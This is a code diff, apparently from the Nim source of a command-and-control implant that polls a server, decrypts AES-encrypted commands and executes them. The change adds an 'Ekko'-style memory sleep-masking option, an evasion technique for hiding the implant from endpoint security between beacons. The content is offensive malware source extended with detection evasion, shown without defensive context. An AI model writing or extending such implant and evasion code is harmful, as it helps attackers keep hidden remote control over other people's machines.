@@ -3,6 +3,7 @@ import config
 import common
 when defined(windows):
     import windows/[windows_core]
+    import windows/utils/incl/nekko
 when defined(linux):
     import linux/[linux_core]
 # External imports
@@ -23,6 +24,7 @@ let client = newHttpClient(userAgent=user_agent)
 proc nimbo_main*(): void =
     var res: Response
     var server_content: JsonNode
+    var sleep_time: int
     var is_success: bool
     when defined(windows):
         windows_start()
@@ -36,7 +38,11 @@ proc nimbo_main*(): void =
             continue
         server_content = parseJson(decrypt_cbc(res.body, communication_aes_key, communication_aes_iv))
         if len(server_content) == 0:
-            sleep(calc_sleep_time(call_home_timeframe, call_home_jitter_percent))
+            sleep_time = calc_sleep_time(call_home_timeframe, call_home_jitter_percent)     
+            if memsleep_technique == 0:
+                sleep(sleep_time)
+            elif memsleep_technique == 1:
+                nEkko(sleep_time)           
             continue
         else:
             for command in server_content:
